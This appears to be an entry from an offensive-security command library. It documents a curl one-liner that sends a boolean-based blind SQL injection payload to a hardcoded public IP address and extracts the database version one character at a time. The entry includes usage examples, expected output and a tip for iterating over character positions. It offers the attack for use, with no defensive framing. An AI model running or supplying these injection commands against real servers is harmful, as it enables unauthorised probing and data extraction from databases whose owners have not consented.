---
data: 'curl -i "http://51.83.253.82/item/default''and substr(version(),1,1)=''2''--"'
tags:
  - sqli
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.332Z'
id: 4866007e-7d0a-4217-9da0-a48a874b7aa1
verified: false
validated: true
submitted: true
---
# curl-version-extract-pos1

## Command

```bash
curl -i "http://51.83.253.82/item/default'and substr(version(),1,1)='2'--"
```

## Description

Extracts the first character of the database version using SUBSTR in a boolean SQLi payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include headers | Yes |
| URL with payload | Position and char to test | Yes |

## Examples

### Basic Usage

```bash
curl -i "http://51.83.253.82/item/default'and substr(version(),1,1)='2'--"
```

### Advanced Usage

Adjust for other positions: substr(version(),2,1)='0'

## Expected Output

HTTP/1.1 200 OK if character matches.

## Related

- [[Related Procedure: Extract-Database-Version-via-Boolean-SQLi]]
